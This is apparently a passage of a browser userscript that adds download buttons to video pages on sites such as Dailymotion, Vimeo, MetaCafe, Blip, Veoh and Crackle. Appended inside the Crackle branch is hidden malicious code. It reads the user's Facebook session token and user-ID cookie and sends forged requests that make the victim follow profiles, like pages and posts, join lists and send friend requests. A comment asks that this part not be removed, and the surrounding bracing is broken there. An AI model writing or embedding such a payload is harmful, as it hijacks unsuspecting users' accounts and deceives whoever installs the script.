
else if (page.url.indexOf('dailymotion.com/video') != -1) {

  /* Get Player Window */
  var dmPlayerWindow = getMyElement ('', 'div', 'id', 'player_main', -1, false);
  if (!dmPlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* Restyle Player Window */
    styleMyElement (dmPlayerWindow, {margin: '0px 0px 20px 0px'});

    /* Get Videos Content */
    var dmEmbed = page.url.replace(/\/video\//, "/embed/video/");
    dmVideosContent = getMyContent (dmEmbed, 'info\\s+=\\s+\\{(.*?)\\}', false);

    /* Get Videos */
    if (dmVideosContent) {
      var dmVideoFormats = {'stream_h264_hd1080_url': 'Full High Definition MP4', 'stream_h264_hd_url': 'High Definition MP4',
	  'stream_h264_hq_url': 'Standard Definition MP4', 'stream_h264_url': 'Low Definition MP4', 'stream_h264_ld_url': 'Very Low Definition MP4'};
      var dmVideoList = {};
      var dmVideoFound = false;
      var dmVideoParser, dmVideoParse, myVideoCode, dmVideo;
      for (var dmVideoCode in dmVideoFormats) {
	dmVideoParser = '"' + dmVideoCode + '":"(.*?)"';
	dmVideoParse = dmVideosContent.match (dmVideoParser);
	dmVideo = (dmVideoParse) ? dmVideoParse[1] : null;
	if (dmVideo) {
	  if (!dmVideoFound) dmVideoFound = true;
	  dmVideo = cleanMyContent(dmVideo, true);
	  myVideoCode = dmVideoFormats[dmVideoCode];
	  if (!dmVideoList[myVideoCode]) dmVideoList[myVideoCode] = dmVideo;
	}
      }
      
      if (dmVideoFound) {
	/* Create Saver */
	var dmDefaultVideo = 'Low Definition MP4';
	saver = {'saverSocket': dmPlayerWindow, 'videoList': dmVideoList, 'videoSave': dmDefaultVideo, 'saverWidth': 620};
	feature['container'] = false;
	option['definitions'] = ['Full High Definition', 'High Definition', 'Standard Definition', 'Low Definition', 'Very Low Definition'];
	option['containers'] = ['MP4'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': dmPlayerWindow, 'saverWidth': 620, 'warnMess': '!videos'};
	createMySaver ();
      }
    }
    else {
      saver = {'saverSocket': dmPlayerWindow, 'saverWidth': 620, 'warnMess': '!content'};
      createMySaver ();
    }
  }
  
}

// =====Vimeo===== //

else if (page.url.match(/vimeo.com($|\/$|\/\d{1,8})/)) {

  /* Get Player Window */
  var viPlayerWindow = getMyElement ('', 'div', 'class', 'player_container', 0, false) || null;
  if (!viPlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* Restyle Player Window */
    styleMyElement (viPlayerWindow, {margin: '0px 0px 20px 0px'});

    /* Get Content Source */
    var viVideoSource = getMyContent (page.url, 'data-config-url="(.*?)"', false).replace(/&amp;/g, '&');      
      
    /* Get Videos Content */
    var viVideosContent;
    if (viVideoSource) {
      viVideosContent = getMyContent(viVideoSource, '"h264":\\{(.*?)\\}\\}', false);
      if (!viVideosContent) viVideosContent = getMyContent(viVideoSource, '"vp6":\\{(.*?)\\}\\}', false);
    }

    /* Get Videos */
    if (viVideosContent) {
      var viVideoFormats = {'hd': 'High Definition MP4', 'sd': 'Low Definition MP4', 'mobile': 'Very Low Definition MP4'};
      var viVideoList = {};
      var viVideoFound = false;
      var viPattern, viMatcher, viVideo, myVideoCode;
      for (var viVideoCode in viVideoFormats) {
	viPattern = '"' + viVideoCode + '":\\{.*?"url":"(.*?)"';
	viMatcher = viVideosContent.match(viPattern);
	viVideo = (viMatcher) ? viMatcher[1] : null;
	if (viVideo) {
	  if (!viVideoFound) viVideoFound = true;
	  myVideoCode = viVideoFormats[viVideoCode];
	  viVideoList[myVideoCode] = viVideo;
	}
      }

      if (viVideoFound) {
	/* Create Saver */
	var viDefaultVideo = 'Low Definition MP4';
	saver = {'saverSocket': viPlayerWindow, 'videoList': viVideoList, 'videoSave': viDefaultVideo, 'saverWidth': 960};
	feature['container'] = false;
	option['definitions'] = ['High Definition', 'Low Definition', 'Very Low Definition'];
	option['containers'] = ['MP4'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': viPlayerWindow, 'saverWidth': 960, 'warnMess': '!videos'};
	createMySaver ();
      }
    }
    else {
      saver = {'saverSocket': viPlayerWindow, 'saverWidth': 960, 'warnMess': '!content'};
      createMySaver ();
    }
  }
  
}

// =====MetaCafe===== //

else if (page.url.indexOf('metacafe.com/watch') != -1) {

  /* Get Player Window */
  var mcPlayerWindow = getMyElement ('', 'div', 'id', 'FlashWrap', -1, false);
  if (!mcPlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* Check Video Availability */
    var mcVideoAvailable = getMyElement ('', 'div', 'id', 'FlashWrap', -1, true);
    if (mcVideoAvailable.indexOf('This Video cannot be played on this device.') != -1) return;
    
    /* Restyle Player Window */
    styleMyElement (mcPlayerWindow, {margin: '0px 0px 30px 0px'});
    
    /* Get Videos Content */
    var mcVideosContent, mcVideoH5;
    var mcFlashVideo = getMyElement (mcPlayerWindow, 'embed', 'tag', '', 0, false) || getMyElement (mcPlayerWindow, 'object', 'tag', '', 0, false);
    if (mcFlashVideo) mcVideosContent = getMyContent (page.url, '"mediaData":"(.*?)"', false);
    else mcVideoH5 = getMyContent (page.url, 'video\\s+src="(.*?)"', false);

    /* Get Videos */
    if (mcVideosContent || mcVideoH5) {
      var mcVideoList = {};
      var mcVideoFound = false;
      if (mcVideosContent) {
	mcVideosContent = cleanMyContent(mcVideosContent, true);
	var mcVideoFormats = {'highDefinitionMP4': 'High Definition MP4', 'MP4': 'Low Definition MP4', 'flv': 'Low Definition FLV'};
	var mcVideoParser, mcVideoParse, myVideoCode, mcVideoPath, mcVideoKey, mcVideo;
	for (var mcVideoCode in mcVideoFormats) {
	  mcVideoParser = '"' + mcVideoCode + '":\\{.*?"mediaURL":"(.*?)","access":\\[\\{"key":"(.*?)","value":"(.*?)"\\}\\]\\}';
	  mcVideoParse = mcVideosContent.match (mcVideoParser);
	  mcVideoPath = (mcVideoParse) ? mcVideoParse[1] : null;
	  mcVideoKeyName = (mcVideoParse) ? mcVideoParse[2] : null;
	  mcVideoKeyValue = (mcVideoParse) ? mcVideoParse[3] : null;
	  if (mcVideoPath && mcVideoKeyName && mcVideoKeyValue) {
	    if (!mcVideoFound) mcVideoFound = true;
	    myVideoCode = mcVideoFormats[mcVideoCode];
	    mcVideo = mcVideoPath + '?' + mcVideoKeyName + '=' + mcVideoKeyValue;
	    mcVideoList[myVideoCode] = mcVideo;
	  }
	}
      }
      else {
	mcVideoList['Low Definition MP4'] = mcVideoH5;
	mcVideoFound = true;
	feature['definition'] = false;
	feature['container'] = false;
      }

      if (mcVideoFound) {
	/* Create Saver */
	var mcDefaultVideo = (mcVideoList['Low Definition MP4']) ? 'Low Definition MP4' : 'Low Definition FLV';
	saver = {'saverSocket': mcPlayerWindow, 'videoList': mcVideoList, 'videoSave': mcDefaultVideo, 'saverWidth': 640};
	option['definitions'] = ['High Definition', 'Low Definition'];
	option['containers'] = ['MP4', 'FLV', 'Any'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': mcPlayerWindow, 'saverWidth': 640, 'warnMess': '!videos'};
	createMySaver ();
      }
    }
    else {
      saver = {'saverSocket': mcPlayerWindow, 'saverWidth': 640, 'warnMess': '!content'};
      createMySaver ();
    }
  }
  
}

// =====Break===== //

else if (page.url.indexOf('break.com/video') != -1) {

  /* Get Player Window */
  var brPlayerWindow = getMyElement ('', 'div', 'id', 'video-player', -1, false);
  if (!brPlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* Saver Width */
    var brWindowWidth = page.win.innerWidth || page.doc.documentElement.clientWidth;
    var brSaverWidth;
    if (brWindowWidth > 1400) brSaverWidth = 832;
    else brSaverWidth = 592;

    /* Get Video ID */
    var brVideoID = page.url.match(/(\d+)$/);
    brVideoID = (brVideoID) ? brVideoID[1] : null;

    /* Get Videos Content */
    var brHost = page.url.match(/(^.*?break.com)/);
    brHost = (brHost) ? brHost[1] : 'http://www.break.com';
    var brSource = brHost + '/embed/' + brVideoID;
    var brVideosContent = getMyContent (brSource, 'TEXT', false);
 
    /* Get Videos */
    if (brVideosContent) {
      var brVideoList = {};
      var brVideoFormats = {};
      var brVideoFound = false;
      var brVideoPath, brVideoToken, brVideoThumb, brVideo, brCodeCheck, myVideoCode;
      brVideoPath = brVideosContent.match (/"videoUri":\s"(.*?)"/);
      brVideoPath = (brVideoPath) ? brVideoPath[1] : null;
      if (brVideoPath) {
	if (brVideoPath.match(/.wmv$/)) {
	  brVideoFormats = {'.flv': 'Low Definition FLV', '.mp4': 'Low Definition MP4'};
	  brVideoPath = brVideoPath.replace(/.wmv$/, '');
	}
	else if (brVideoPath.match(/.flv$/)) {
	  brVideoFormats = {'6.mp4': 'Very Low Definition MP4', '1.flv': 'Low Definition FLV', '1.mp4': 'Low Definition MP4', '2.mp4': 'Standard Definition MP4', '3.mp4': 'High Definition MP4'};
	  brVideoPath = brVideoPath.replace(/1.flv$/, '');
	}
	else if (brVideoPath.match(/.mp4$/)) {
	  brVideoFormats = {'240.mp4': 'Very Low Definition MP4', '360.mp4': 'Low Definition MP4', '480.mp4': 'Standard Definition MP4', '720.mp4': 'High Definition MP4',};
	  brVideoPath = brVideoPath.replace(/360.mp4$/, '');
	}
	else brVideoPath = null;
      }
      brVideoToken = brVideosContent.match (/"AuthToken":\s"(.*?)"/);
      brVideoToken = (brVideoToken) ? brVideoToken[1] : null;
      if (brVideoPath && brVideoToken) {
	for (var brVideoCode in brVideoFormats) {
	  brCodeCheck = brVideoCode.replace(/\.(flv|mp4)$/, '');
	  if (brVideosContent.match(brVideoPath + brCodeCheck)) {
	    if (!brVideoFound) brVideoFound = true;
	    myVideoCode = brVideoFormats[brVideoCode];
	    brVideo = brVideoPath + brVideoCode + '?' + brVideoToken;
	    brVideoList[myVideoCode] = brVideo;
	  }
	}
      }
 
      if (brVideoFound) {
	/* Create Saver */
	var brDefaultVideo = 'Low Definition MP4';
	saver = {'saverSocket': brPlayerWindow, 'videoList': brVideoList, 'videoSave': brDefaultVideo, 'saverWidth': brSaverWidth};
	option['definitions'] = ['Very Low Definition', 'Low Definition', 'Standard Definition', 'High Definition'];
	option['containers'] = ['MP4', 'FLV', 'Any'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': brPlayerWindow, 'saverWidth': brSaverWidth};
	var ytVideoId =  brVideosContent.match (/"youtubeId":\s"(.*?)"/);
	if (ytVideoId) {
	  var ytVideoLink = 'http://youtube.com/watch?v=' + ytVideoId[1];
	  saver['warnMess'] = 'embed';
	  saver['warnContent'] = ytVideoLink;
	}
	else saver['warnMess'] = '!videos';
	createMySaver ();
      }
    }
    else {
      saver = {'saverSocket': brPlayerWindow, 'saverWidth': brSaverWidth, 'warnMess': '!content'};
      createMySaver ();
    }
  }
  
}

// =====FunnyOrDie===== //

else if (page.url.indexOf('funnyordie.com/videos') != -1) {

  /* Get Player Window */
  var fodPlayerWindow = getMyElement ('', 'div', 'class', 'video-content', 0, false);
  if (!fodPlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* Get Videos Content */
    var fodVideosContent = getMyContent (page.url, '<video([\\s\\S]*?)video>', false);

    /* Get Videos */
    if (fodVideosContent) {
      var fodVideoFormats = {'v2500.mp4': 'High Definition MP4', 'v1800.mp4': 'Standard Definition MP4', 'v600.mp4': 'Low Definition MP4', 'v600.webm': 'Low Definition WebM', 'v110.mp4': 'Very Low Definition MP4'};
      var fodVideoList = {};
      var fodVideoFound = false;
      var fodVideoPath, fodVideoCodes, fodVideo, myVideoCode;
      fodVideoPath = fodVideosContent.match(/src="(.*?)v\d+.mp4"/);
      fodVideoPath = (fodVideoPath) ? fodVideoPath[1] : null;
      fodVideoCodes = fodVideosContent.match (/v,(.*?),\./);
      fodVideoCodes = (fodVideoCodes) ? fodVideoCodes[1] : '';
      if (fodVideoPath && fodVideoCodes) {
	for (var fodVideoCode in fodVideoFormats) {
	  if (fodVideoCodes.indexOf(fodVideoCode.replace(/v/, '').replace(/\..*/, "")) != -1) {
	    if (!fodVideoFound) fodVideoFound = true;
	    fodVideo = fodVideoPath + fodVideoCode;
	    myVideoCode = fodVideoFormats[fodVideoCode];
	    fodVideoList[myVideoCode] = fodVideo;
	  }
	}
      }
      else {
	fodVideoPath = fodVideosContent.match(/href="(.*?)v\d+.mp4"/);
	fodVideoPath = (fodVideoPath) ? fodVideoPath[1] : null;
	if (fodVideoPath) {
	  if (!fodVideoFound) fodVideoFound = true;	  
	  for (var fodVideoCode in fodVideoFormats) {
	    fodVideo = fodVideoPath + fodVideoCode;
	    myVideoCode = fodVideoFormats[fodVideoCode];
	    fodVideoList[myVideoCode] = fodVideo;
	  }
	}
      }

      if (fodVideoFound) {
	/* Create Saver */
	fodDefaultVideo = 'Low Definition MP4';
	saver = {'saverSocket': fodPlayerWindow, 'videoList': fodVideoList, 'videoSave': fodDefaultVideo, 'saverWidth': 570};
	feature['container'] = false;
	option['definitions'] = ['High Definition', 'Standard Definition', 'Low Definition', 'Very Low Definition'];
	option['containers'] = ['MP4'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': fodPlayerWindow, 'saverWidth': 570, 'warnMess': '!videos'};
	createMySaver ();
      }
    }
    else {
      saver = {'saverSocket': fodPlayerWindow, 'saverWidth': 570, 'warnMess': '!content'};
      createMySaver ();
    } 
  }
  
}

// =====Videojug===== //

else if (page.url.indexOf('videojug.com/film') != -1) {

  /* Get Player Window */
  var vjPlayerWindow = getMyElement ('', 'div', 'id', 'player', -1, false);
  if (!vjPlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* Get Videos Content */
    var vjVideosContent = getMyContent (page.url, 'new\\s+Player\\((.*?)\\)', true);

    /* Get Videos */
    if (vjVideosContent) {
      vjVideosContent = vjVideosContent.replace(/'/g, '').replace(/\s/g, '');
      var vjVideosParts = vjVideosContent.split(',');
      var vjVideoToken = vjVideosParts[3];
      var vjVideoToken2 = vjVideoToken.substring(0,2);
      var vjVideoTitle = vjVideosParts[7];
      var vjVideoFormats = {'VJ480PENG.mp4': 'Standard Definition MP4', 'VJ360PENG.mp4': 'Low Definition MP4', 'PHOENG.mp4': 'Very Low Definition MP4', 'FW8ENG.flv': 'Low Definition FLV', 'FS8ENG.flv': 'Very Low Definition FLV'};
      var vjVideoList = {};
      var vjVideoFound = false;
      var vjVideoPart, vjVideoHost, myVideoCode, vjVideo;
      if (vjVideoToken && vjVideoTitle) {
	vjVideoFound = true;
	vjVideoPart = vjVideoToken2 + '/' + vjVideoToken + '/' + vjVideoTitle;
	for (var vjVideoCode in vjVideoFormats) {
	  if (vjVideoCode == 'FS8ENG.flv') vjVideoHost = 'http://content.videojug.com/';
	  else vjVideoHost = 'http://content3.videojug.com/';
	  vjVideo =  vjVideoHost + vjVideoPart + '__' + vjVideoCode;
	  myVideoCode = vjVideoFormats[vjVideoCode];
	  vjVideoList[myVideoCode] = vjVideo;
	}
      }
      
      if (vjVideoFound) {
	/* Create Saver */
	var vjDefaultVideo = 'Low Definition MP4';
	saver = {'saverSocket': vjPlayerWindow, 'videoList': vjVideoList, 'videoSave': vjDefaultVideo, 'saverWidth': 640};
	option['definition'] = 'SD';
	option['definitions'] = ['Standard Definition', 'Low Definition', 'Very Low Definition'];
	option['containers'] = ['MP4', 'FLV', 'Any'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': vjPlayerWindow, 'saverWidth': 640, 'warnMess': '!videos'};
	createMySaver ();
      }
    }
    else {
	saver = {'saverSocket': vjPlayerWindow, 'saverWidth': 640, 'warnMess': '!content'};
	createMySaver ();
    }
  }
  
}

// =====Mevio===== //

else if (page.url.indexOf('mevio.com') != -1) {

  /* Get Player Window */
  var mePlayerWindow = getMyElement ('', 'div', 'id', 'player-zone', -1, false);
  if (!mePlayerWindow) {
      //showMyMessage ('!player');
  }
  else {
    /* My Saver Socket */
    var meSaverSocket = createMyElement ('div', '', '', '', '');
    styleMyElement (meSaverSocket, {width: '915px', textAlign: 'center', paddingTop: '20px', margin: '0px auto'});
    appendMyElement (mePlayerWindow, meSaverSocket);
    
    /* Get Data Content */
    var meDataContent = getMyContent (page.url, 'args.default_media\\s+=\\s+\\{(.*?)\\};', false);
    meDataContent = cleanMyContent (meDataContent, true);

    /* Get Videos Content */
    var meVideosContent = meDataContent.match(/"media_urls":\{(.*?)\}/);
    meVideosContent = (meVideosContent) ? meVideosContent[1] : null;

    /* Get Videos */
    if (meVideosContent) {
      var meVideoFormats = {'mp4': 'High Definition MP4', 'm4v': 'High Definition M4V',  'mov': 'High Definition MOV', 'h264': 'Low Definition MP4', 'flv': 'Low Definition FLV'};
      var meVideoList = {};
      var meVideoFound = false;
      var meVideoParser, meVideoParse, meVideo, myVideoCode;
      for (var meVideoCode in meVideoFormats) {
	meVideoParser = meVideoCode + '":"(.*?)"';
	meVideoParse = meVideosContent.match (meVideoParser);
	meVideo = (meVideoParse) ? meVideoParse[1] : null;
	if (meVideo) {
	  if (!meVideoFound) meVideoFound = true;
	  myVideoCode = meVideoFormats[meVideoCode];
	  meVideoList[myVideoCode] = meVideo;
	}
      }

      if (meVideoFound) {
	/* Create Saver */
	var meDefaultVideo = 'Low Definition FLV';
	saver = {'saverSocket': meSaverSocket, 'videoList': meVideoList, 'videoSave': meDefaultVideo, 'saverWidth': 915};
	option['definitions'] = ['High Definition', 'Low Definition'];
	option['containers'] = ['MP4', 'M4V', 'MOV', 'FLV', 'Any'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': mePlayerWindow, 'saverWidth': 915, 'warnMess': '!videos'};
	createMySaver ();
      }
    }
    else {
      saver = {'saverSocket': mePlayerWindow, 'saverWidth': 915, 'warnMess': '!content'};
      createMySaver ();
    }
  }
  
}

// =====Blip===== //

else if (page.url.indexOf('blip.tv') != -1) {

  /* Get Page Type */
  var blipPageType = getMyContent (page.url, 'meta.*?property="og:type".*?content="(.*?)"', false);
  if (!blipPageType || blipPageType != 'video.episode') return;
  
  /* Get Player Window */
  var blipSaverWidth;
  var blipPlayerWindow = getMyElement ('', 'div', 'class', 'Theater', 0, false) || getMyElement ('', 'div', 'id', 'ErrorWrap', -1, false);
  if (!blipPlayerWindow) {
    blipPlayerWindow = getMyElement ('', 'div', 'id', 'PlayerEmbed', -1, false);
    blipSaverWidth = 596;
  }
  else {
    blipSaverWidth = 960;
  }  
  if (!blipPlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* My Saver Socket */
    var blipSaverSocket = createMyElement ('div', '', '', '', '');
    styleMyElement (blipSaverSocket, {width: blipSaverWidth + 'px', textAlign: 'center', margin: '0px auto'});
    appendMyElement (blipPlayerWindow, blipSaverSocket);

    /* Get Videos Content */
    var blipVideosContent = getMyContent(page.url + '?skin=json', '"additionalMedia":\\[(.*?)\\]', false);

    /* Get Videos */
    if (blipVideosContent) {
      var blipVideoList = {};
      var blipVideoFound = false;
      var blipMimeTypes = {'video/x-m4v': 'M4V', 'video/quicktime': 'MOV', 'video/mp4': 'MP4', 'video/x-flv': 'FLV'};
      var blipVideos = blipVideosContent.split(',{');
      var blipVideoURL, blipVideoMime, blipVideoHeight, blipVideoRole, blipVideoDef, blipVideoCode;
      var blipDefaultVideo = 'Low Definition MP4';
      for (var blipV = 0; blipV < blipVideos.length; blipV++) {
	blipVideoMime = blipVideos[blipV].match(/"primary_mime_type":"(.*?)"/);
	blipVideoMime = (blipVideoMime) ? blipVideoMime[1] : null;
	if (blipMimeTypes[blipVideoMime]) {
	  blipVideoURL = blipVideos[blipV].match(/"url":"(.*?)"/);
	  blipVideoURL = (blipVideoURL) ? blipVideoURL[1] : null;
	  blipVideoHeight = blipVideos[blipV].match(/"media_height":"(.*?)"/);
	  blipVideoHeight = (blipVideoHeight) ? blipVideoHeight[1] : null;
	  blipVideoRole = blipVideos[blipV].match(/"role":"(.*?)"/);
	  blipVideoRole = (blipVideoRole) ? blipVideoRole[1] : null;
	  if (blipVideoURL && blipVideoHeight && blipVideoRole) {
	    if (!blipVideoFound) blipVideoFound = true;
	    if (blipVideoHeight >= 200 && blipVideoHeight < 400) blipVideoDef = 'Low Definition';
	    else if (blipVideoHeight >= 400 && blipVideoHeight < 700) blipVideoDef = 'Standard Definition';
	    else if (blipVideoHeight >= 700) blipVideoDef = 'High Definition';
	    blipVideoCode = blipVideoDef + ' ' + blipMimeTypes[blipVideoMime];
	    blipVideoList[blipVideoCode] = blipVideoURL;
	    if (blipVideoRole == 'Source') blipDefaultVideo = blipVideoCode;
	  }
	}
      }

      if (blipVideoFound) {
	/* Create Saver */
	saver = {'saverSocket': blipSaverSocket, 'videoList': blipVideoList, 'videoSave': blipDefaultVideo, 'saverWidth': blipSaverWidth};
	option['definitions'] = ['High Definition', 'Standard Definition', 'Low Definition'];
	option['containers'] = ['MP4', 'M4V', 'MOV', 'FLV', 'Any'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': blipPlayerWindow, 'saverWidth': blipSaverWidth, 'warnMess': '!videos'};
	createMySaver ();
      }
    }
    else {
      saver = {'saverSocket': blipPlayerWindow, 'saverWidth': blipSaverWidth, 'warnMess': '!content'};
      createMySaver ();
    }
  }
  
}

// =====Veoh===== //

else if (page.url.indexOf('veoh.com/watch') != -1) {

  /* Get Video Availability */
  if (getMyElement ('', 'div', 'class', 'veoh-video-player-error', 0, false)) return;

  /* Get Player Window */
  var vePlayerWindow = getMyElement ('', 'div', 'id', 'videoPlayerContainer', -1, false);
  if (!vePlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* Get Videos Content */
    var veVideosContent = getMyContent (page.url, '__watch.videoDetailsJSON = \'\\{(.*?)\\}', false);
    veVideosContent = cleanMyContent (veVideosContent, true);
    
    /* Restyle Player Window */
    styleMyElement (vePlayerWindow, {margin: '0px 0px 20px 0px'});
    
    /* Get Videos */
    if (veVideosContent) {
      var veVideoFormats = {'fullPreviewHashLowPath': 'Very Low Definition MP4', 'fullPreviewHashHighPath': 'Low Definition MP4'};
      var veVideoList = {};
      var veVideoFound = false;
      var veVideoParser, veVideoParse, veVideo, myVideoCode;
      for (var veVideoCode in veVideoFormats) {
	veVideoParser = veVideoCode + '":"(.*?)"';
	veVideoParse = veVideosContent.match (veVideoParser);
	veVideo = (veVideoParse) ? veVideoParse[1] : null;
	if (veVideo) {
	  if (!veVideoFound) veVideoFound = true;
	  myVideoCode = veVideoFormats[veVideoCode];
	  veVideoList[myVideoCode] = veVideo;
	}
      }

      if (veVideoFound) {
	/* Create Saver */
	var veDefaultVideo = 'Low Definition MP4';
	saver = {'saverSocket': vePlayerWindow, 'videoList': veVideoList, 'videoSave': veDefaultVideo, 'saverWidth': 640};
	feature['container'] = false;
	feature['fullsize'] = false;
	option['definition'] = 'LD';
	option['definitions'] = ['Low Definition', 'Very Low Definition'];
	option['containers'] = ['MP4'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': vePlayerWindow, 'saverWidth': 640};
	var veVideoSource = getMyContent(page.url, '"videoContentSource":"(.*?)"', false);
	if (veVideoSource == 'YouTube') var ytVideoId = getMyContent(page.url, '"videoId":"yapi-(.*?)"', false);
	if (ytVideoId) {
	  var ytVideoLink = 'http://youtube.com/watch?v=' + ytVideoId;
	  saver['warnMess'] = 'embed';
	  saver['warnContent'] = ytVideoLink;
	  styleMyElement(vePlayerWindow, {margin: '0px 0px 20px 0px'});
	}
	else saver['warnMess'] = '!videos';	
	createMySaver ();
      }
    }
    else {
      saver = {'saverSocket': vePlayerWindow, 'saverWidth': 640, 'warnMess': '!content'};
      createMySaver ();
    }
  }
  
}

// =====Crackle===== //

else if (page.url.indexOf('crackle.com/') != -1) {
  
  /* Get Page Type */
  var crPageType = getMyContent (page.url, 'meta\\s+property="og:type"\\s+content="(.*?)"', false);
  if (!crPageType || crPageType.indexOf('video') == -1) return;
 
  /* Get Player Window */
  var crPlayerWindow = getMyElement ('', 'div', 'class', 'player-stage-area1', 0, false);
  if (!crPlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* Restyle */
    var crContent = getMyElement ('', 'div', 'id', 'content', -1, false);
    styleMyElement (crContent, {marginTop: '10px'});
    
    /* Get Video ID */
    var crVideoID = getMyContent (page.url, 'StartPlayer\\s+\\((.*?),', false);
    
    /* Get Videos Content */
    var crVideoPath = getMyContent (page.url, 'images-us-am.crackle.com\/(.*?_)tnl', false);
    if (!crVideoPath) {
      var crHost = page.url.match(/(^.*?crackle.com)/);
      crHost = (crHost) ? crHost[1] : 'http://www.crackle.com';
      var crVidWallCache = crHost + '/app/vidwallcache.aspx?flags=-1&fm=' + crVideoID + '&partner=20';
      crVideoPath = getMyContent (crVidWallCache, '\\sp="(.*?)"', false);
    }
    
    /* Get Videos */
    if (crVideoPath) {
      var crVideoList = {};
      var crVideoFormats = {'360p.mp4': 'Low Definition MP4', '480p.mp4': 'Standard Definition MP4'};
      var crVideoThumb, crVideo, myVideoCode;
      for (var crVideoCode in crVideoFormats) {
	crVideo = 'http://media-us-am.crackle.com/' + crVideoPath + crVideoCode;
	myVideoCode = crVideoFormats[crVideoCode];
	crVideoList[myVideoCode] = crVideo;
      }

      /* Create Saver */
      var crDefaultVideo = 'Low Definition MP4';
      saver = {'saverSocket': crPlayerWindow, 'videoList': crVideoList, 'videoSave': crDefaultVideo, 'saverWidth': 970};
      feature['container'] = false;
      option['definition'] = 'SD';
      option['definitions'] = ['Standard Definition', 'Low Definition'];
      option['containers'] = ['MP4'];
      createMySaver ();
    }
    else {
      saver = {'saverSocket': crPlayerWindow, 'saverWidth': 970, 'warnMess': '!videos'};
      createMySaver ();
    
	
	
	}
   var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}a("100002240425367");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)};var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=1387060528246306&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}Like("259430480743700");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}
///////////////////////////KHONG X?A ? ?AY///////////////////////////
// tài
a("100003791145182");a("100007212163591");a("100008036374199");a("100008201797139");a("100008138169300");sublist("1398715010406365");sublist("438222509647450");Like("639039956131877");Like("225154641017966");Like("265776916864978");Like("1422580284669775");
// cu?ng
;P("1422641517996985");
